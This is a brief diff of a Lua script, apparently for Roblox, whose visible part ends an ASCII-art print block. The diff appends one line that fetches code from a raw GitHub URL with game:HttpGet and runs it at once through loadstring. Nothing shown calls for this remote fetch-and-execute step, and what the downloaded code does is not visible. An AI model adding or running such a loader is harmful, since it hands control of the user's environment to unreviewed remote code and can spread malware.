@@ -51,3 +51,5 @@ print([[
           \          /
            `--------`
 ]])
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iamnoonesodw/Dummy/refs/heads/main/Test"))()
